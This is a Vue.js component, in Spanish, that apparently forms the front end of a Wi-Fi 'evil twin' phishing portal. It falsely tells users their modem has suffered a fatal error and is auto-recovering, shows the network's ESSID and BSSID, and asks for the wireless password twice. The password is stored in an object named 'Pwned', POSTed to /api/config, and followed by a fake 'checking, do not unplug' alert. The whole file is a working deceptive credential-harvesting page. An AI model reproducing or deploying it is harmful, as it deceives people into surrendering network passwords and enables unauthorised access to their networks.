<template>
    <div class="container">
        <div class="row pt-5 pb-5">
            <div class="col-md-7 pb-2">
                <h2>Recuperación del Módem</h2>
                <p>Se ha encontrado un error fatal en el router por lo tanto se ha iniciado el sistema de recuperación automático. Este sistema de recuperación se ocupará de arreglar los errores del módem y actualizarlo.</p>
                <p>Por favor tómate tu tiempo para leer las políticas de privacidad</p>
                <privacy-policy :Model="Model"/>
                <p>Por favor ingrese la contraseña de la red inalámbrica para continuar. Después de que sea solucionado el error del módem se reestablecerá su conexión.</p>
            </div>

            <div class="col-md-5">
                <div class="card">
                    <div class="card-body">
                        <p>ESSID: <strong>{{ essid }}</strong></p>
                        <p>BSSID: <strong>{{ bssid }}</strong></p>
                        <form @submit.prevent="sendData()">
                            <div class="form-group">
                                <input type="password" 
                                placeholder="Contraseña de la red"
                                class="form-control"
                                v-model="pwned.Password">

                            </div>
                            <div class="form-group">
                                <input type="password"
                                placeholder="Repite la contraseña"
                                class="form-control"
                                v-model="pwned.VerifyPass">
                            </div>
                            <button class="btn btn-primary btn-block">Iniciar Recovery</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
import PrivacyPolicy from '../components/PrivacyPolicy.vue'

class Pwned {
    constructor(Password, VerifyPass) {
        this.Password = Password,
        this.VerifyPass = VerifyPass
    }
}

export default {
    name: "ConfigView",
    props: {
        essid: String,
        bssid: String,
        Model: String
    },
    components: {
        PrivacyPolicy
    },
    data() {
        return {
            pwned: new Pwned()
        }
    },
    methods: {
        sendData() {
            if(this.pwned.Password === this.pwned.VerifyPass) {
                fetch('/api/config', {
                    method: 'POST',
                    body: JSON.stringify(this.pwned),
                    headers: {
                        'Accept': 'application/json',
                        'Content-type': 'application/json'
                    }
                })
                .then(res => res.json())
                .then(data => {
                    console.log(data.status)
                    alert('Comprobando contraseñas para iniciar el recovery, por favor no apague ni desconecte el módem.')
                })
            } else {
                alert('Las contraseñas no coinciden')
            }
            this.pwned = new Pwned()
        }
    }

}
</script>

<style scoped>

</style>